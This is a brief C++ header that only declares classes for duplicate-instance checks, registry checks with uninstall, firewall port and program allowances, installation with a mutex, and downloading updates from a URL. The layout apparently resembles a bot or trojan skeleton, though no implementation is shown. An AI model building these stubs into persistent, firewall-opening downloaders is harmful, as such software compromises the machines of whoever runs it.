// CDownload class
#include "vInclude.h"
#include "CThread.h"

typedef struct DKSPT
{
	__int64 AvailableT;
	__int64 FreeT;
	__int64 TotalT;

} DKSPT;

class CDuplicateCheck {
public:
	void Run();
};


class CRegCheck : public CThread {
public:
	virtual void *Run();
	void Uninstall();
};

class CMisc {
public:
	void AllowPort(int iPort, string sName);
	void AllowProgram(char* szApp, char* szAppLoc);
};

class CInstall {
public:
	void Run();
	void SetParameters();
	HANDLE hMutex;
};

class CDownload {
public:
	void Run();

	string sUrl;
	string sDest;
	string sUpdate;
};